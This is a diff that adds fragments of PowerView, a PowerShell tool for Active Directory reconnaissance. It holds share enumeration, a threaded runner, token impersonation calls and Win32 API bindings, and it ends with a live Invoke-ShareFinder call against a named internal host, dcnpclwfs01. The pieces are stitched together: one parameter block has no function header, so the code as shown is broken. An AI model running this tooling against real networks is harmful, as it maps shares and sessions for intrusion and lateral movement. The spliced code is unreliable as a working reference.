+            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
+
+            # locate the offset of the initial intPtr
+            $Offset = $PtrInfo.ToInt64()
+
+            # 0 = success
+            if (($Result -eq 0) -and ($Offset -gt 0)) {
+
+                # work out how much to increment the pointer by finding out the size of the structure
+                $Increment = $SHARE_INFO_1::GetSize()
+
+                # parse all the result structures
+                for ($i = 0; ($i -lt $EntriesRead); $i++) {
+                    # create a new int ptr at the given offset and cast the pointer as our result structure
+                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
+                    $Info = $NewIntPtr -as $SHARE_INFO_1
+
+                    # return all the sections of the structure - have to do it this way for V2
+                    $Share = $Info | Select-Object *
+                    $Share | Add-Member Noteproperty 'ComputerName' $Computer
+                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
+                    $Offset = $NewIntPtr.ToInt64()
+                    $Offset += $Increment
+                    $Share
+                }
+
+                # free up the result buffer
+                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
+            }
+            else {
+                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
+            }
+        }
+    }
+
+    END {
+        if ($LogonToken) {
+            Invoke-RevertToSelf -TokenHandle $LogonToken
+        }
+    }
+}
+
+
+        [Parameter(Position = 1, Mandatory = $True)]
+        [System.Management.Automation.ScriptBlock]
+        $ScriptBlock,
+
+        [Parameter(Position = 2)]
+        [Hashtable]
+        $ScriptParameters,
+
+        [Int]
+        [ValidateRange(1,  100)]
+        $Threads = 20,
+
+        [Switch]
+        $NoImports
+    )
+
+    BEGIN {
+      
+        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
+
+        # # $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
+        # force a single-threaded apartment state (for token-impersonation stuffz)
+        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA
+
+        # import the current session state's variables and functions so the chained PowerView
+        #   functionality can be used by the threaded blocks
+        if (-not $NoImports) {
+            # grab all the current variables for this runspace
+            $MyVars = Get-Variable -Scope 2
+
+            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
+            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
+
+            # add Variables from Parent Scope (current runspace) into the InitialSessionState
+            ForEach ($Var in $MyVars) {
+                if ($VorbiddenVars -NotContains $Var.Name) {
+                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
+                }
+            }
+
+            # add Functions from current runspace to the InitialSessionState
+            ForEach ($Function in (Get-ChildItem Function:)) {
+                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
+            }
+        }
+
+        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
+        $Pool.Open()
+
+        # do some trickery to get the proper BeginInvoke() method that allows for an output queue
+        $Method = $Null
+        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
+            $MethodParameters = $M.GetParameters()
+            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
+                $Method = $M.MakeGenericMethod([Object], [Object])
+                break
+            }
+        }
+
+        $Jobs = @()
+        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
+        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)"
+
+        # partition all hosts from -ComputerName into $Threads number of groups
+        if ($Threads -ge $ComputerName.Length) {
+            $Threads = $ComputerName.Length
+        }
+        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
+        $ComputerNamePartitioned = @()
+        $Start = 0
+        $End = $ElementSplitSize
+
+        for($i = 1; $i -le $Threads; $i++) {
+            $List = New-Object System.Collections.ArrayList
+            if ($i -eq $Threads) {
+                $End = $ComputerName.Length
+            }
+            $List.AddRange($ComputerName[$Start..($End-1)])
+            $Start += $ElementSplitSize
+            $End += $ElementSplitSize
+            $ComputerNamePartitioned += @(,@($List.ToArray()))
+        }
+
+        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $Threads"
+
+        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
+            # create a "powershell pipeline runner"
+            $PowerShell = [PowerShell]::Create()
+            $PowerShell.runspacepool = $Pool
+
+            # add the script block + arguments with the given computer partition
+            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', $ComputerNamePartition)
+            if ($ScriptParameters) {
+                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
+                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
+                }
+            }
+
+            # create the output queue
+            $Output = New-Object Management.Automation.PSDataCollection[Object]
+
+            # kick off execution using the BeginInvok() method that allows queues
+            $Jobs += @{
+                PS = $PowerShell
+                Output = $Output
+                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
+            }
+        }
+    }
+
+    END {
+        Write-Verbose "[New-ThreadedFunction] Threads executing"
+
+        # continuously loop through each job queue, consuming output as appropriate
+        Do {
+            ForEach ($Job in $Jobs) {
+                $Job.Output.ReadAll()
+            }
+            Start-Sleep -Seconds 1
+        }
+        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
+
+        $SleepSeconds = 100
+        Write-Verbose "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."
+
+        # cleanup- make sure we didn't miss anything
+        for ($i=0; $i -lt $SleepSeconds; $i++) {
+            ForEach ($Job in $Jobs) {
+                $Job.Output.ReadAll()
+                $Job.PS.Dispose()
+            }
+            Start-Sleep -S 1
+        }
+
+        $Pool.Dispose()
+        Write-Verbose "[New-ThreadedFunction] all threads completed"
+    }
+}
+
+
+$Mod = New-InMemoryModule -ModuleName Win32
+
+# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', Scope='Function', Target='psenum')]
+
+# used to parse the 'samAccountType' property for users/computers/groups
+$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
+    DOMAIN_OBJECT                   =   '0x00000000'
+    GROUP_OBJECT                    =   '0x10000000'
+    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
+    ALIAS_OBJECT                    =   '0x20000000'
+    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
+    USER_OBJECT                     =   '0x30000000'
+    MACHINE_ACCOUNT                 =   '0x30000001'
+    TRUST_ACCOUNT                   =   '0x30000002'
+    APP_BASIC_GROUP                 =   '0x40000000'
+    APP_QUERY_GROUP                 =   '0x40000001'
+    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
+}
+
+# used to parse the 'grouptype' property for groups
+$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
+    CREATED_BY_SYSTEM               =   '0x00000001'
+    GLOBAL_SCOPE                    =   '0x00000002'
+    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
+    UNIVERSAL_SCOPE                 =   '0x00000008'
+    APP_BASIC                       =   '0x00000010'
+    APP_QUERY                       =   '0x00000020'
+    SECURITY                        =   '0x80000000'
+} -Bitfield
+
+# used to parse the 'userAccountControl' property for users/groups
+$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
+    SCRIPT                          =   1
+    ACCOUNTDISABLE                  =   2
+    HOMEDIR_REQUIRED                =   8
+    LOCKOUT                         =   16
+    PASSWD_NOTREQD                  =   32
+    PASSWD_CANT_CHANGE              =   64
+    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
+    TEMP_DUPLICATE_ACCOUNT          =   256
+    NORMAL_ACCOUNT                  =   512
+    INTERDOMAIN_TRUST_ACCOUNT       =   2048
+    WORKSTATION_TRUST_ACCOUNT       =   4096
+    SERVER_TRUST_ACCOUNT            =   8192
+    DONT_EXPIRE_PASSWORD            =   65536
+    MNS_LOGON_ACCOUNT               =   131072
+    SMARTCARD_REQUIRED              =   262144
+    TRUSTED_FOR_DELEGATION          =   524288
+    NOT_DELEGATED                   =   1048576
+    USE_DES_KEY_ONLY                =   2097152
+    DONT_REQ_PREAUTH                =   4194304
+    PASSWORD_EXPIRED                =   8388608
+    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
+    PARTIAL_SECRETS_ACCOUNT         =   67108864
+} -Bitfield
+
+# enum used by $WTS_SESSION_INFO_1 below
+$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
+    Active       =    0
+    Connected    =    1
+    ConnectQuery =    2
+    Shadow       =    3
+    Disconnected =    4
+    Idle         =    5
+    Listen       =    6
+    Reset        =    7
+    Down         =    8
+    Init         =    9
+}
+
+# the WTSEnumerateSessionsEx result structure
+$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
+    ExecEnvId = field 0 UInt32
+    State = field 1 $WTSConnectState
+    SessionId = field 2 UInt32
+    pSessionName = field 3 String -MarshalAs @('LPWStr')
+    pHostName = field 4 String -MarshalAs @('LPWStr')
+    pUserName = field 5 String -MarshalAs @('LPWStr')
+    pDomainName = field 6 String -MarshalAs @('LPWStr')
+    pFarmName = field 7 String -MarshalAs @('LPWStr')
+}
+
+# the particular WTSQuerySessionInformation result structure
+$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
+    AddressFamily = field 0 UInt32
+    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
+}
+
+# the NetShareEnum result structure
+$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
+    Name = field 0 String -MarshalAs @('LPWStr')
+    Type = field 1 UInt32
+    Remark = field 2 String -MarshalAs @('LPWStr')
+}
+
+# the NetWkstaUserEnum result structure
+$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
+    UserName = field 0 String -MarshalAs @('LPWStr')
+    LogonDomain = field 1 String -MarshalAs @('LPWStr')
+    AuthDomains = field 2 String -MarshalAs @('LPWStr')
+    LogonServer = field 3 String -MarshalAs @('LPWStr')
+}
+
+# the NetSessionEnum result structure
+$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
+    CName = field 0 String -MarshalAs @('LPWStr')
+    UserName = field 1 String -MarshalAs @('LPWStr')
+    Time = field 2 UInt32
+    IdleTime = field 3 UInt32
+}
+
+# enum used by $LOCALGROUP_MEMBERS_INFO_2 below
+$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
+    SidTypeUser             = 1
+    SidTypeGroup            = 2
+    SidTypeDomain           = 3
+    SidTypeAlias            = 4
+    SidTypeWellKnownGroup   = 5
+    SidTypeDeletedAccount   = 6
+    SidTypeInvalid          = 7
+    SidTypeUnknown          = 8
+    SidTypeComputer         = 9
+}
+
+# the NetLocalGroupEnum result structure
+$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
+    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
+    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
+}
+
+# the NetLocalGroupGetMembers result structure
+$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
+    lgrmi2_sid = field 0 IntPtr
+    lgrmi2_sidusage = field 1 $SID_NAME_USE
+    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
+}
+
+# enums used in DS_DOMAIN_TRUSTS
+$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
+    IN_FOREST       = 1
+    DIRECT_OUTBOUND = 2
+    TREE_ROOT       = 4
+    PRIMARY         = 8
+    NATIVE_MODE     = 16
+    DIRECT_INBOUND  = 32
+} -Bitfield
+$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
+    DOWNLEVEL   = 1
+    UPLEVEL     = 2
+    MIT         = 3
+    DCE         = 4
+}
+$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
+    NON_TRANSITIVE      = 1
+    UPLEVEL_ONLY        = 2
+    FILTER_SIDS         = 4
+    FOREST_TRANSITIVE   = 8
+    CROSS_ORGANIZATION  = 16
+    WITHIN_FOREST       = 32
+    TREAT_AS_EXTERNAL   = 64
+}
+
+# the DsEnumerateDomainTrusts result structure
+$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
+    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
+    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
+    Flags = field 2 $DsDomainFlag
+    ParentIndex = field 3 UInt32
+    TrustType = field 4 $DsDomainTrustType
+    TrustAttributes = field 5 $DsDomainTrustAttributes
+    DomainSid = field 6 IntPtr
+    DomainGuid = field 7 Guid
+}
+
+# used by WNetAddConnection2W
+$NETRESOURCEW = struct $Mod NETRESOURCEW @{
+    dwScope =         field 0 UInt32
+    dwType =          field 1 UInt32
+    dwDisplayType =   field 2 UInt32
+    dwUsage =         field 3 UInt32
+    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
+    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
+    lpComment =       field 6 String -MarshalAs @('LPWStr')
+    lpProvider =      field 7 String -MarshalAs @('LPWStr')
+}
+
+# all of the Win32 API functions we need
+$FunctionDefinitions = @(
+    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
+    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
+    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
+    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
+    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
+    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
+    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
+    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
+    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
+    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
+    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
+    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
+    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
+    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
+    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
+    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
+    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
+    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
+    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
+    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
+    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
+    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
+    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
+)
+
+$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
+$Netapi32 = $Types['netapi32']
+$Advapi32 = $Types['advapi32']
+$Wtsapi32 = $Types['wtsapi32']
+$Mpr = $Types['Mpr']
+$Kernel32 = $Types['kernel32']
+
+
+Set-Alias Invoke-ShareFinder Find-DomainShare
+
+Invoke-ShareFinder -ComputerName dcnpclwfs01
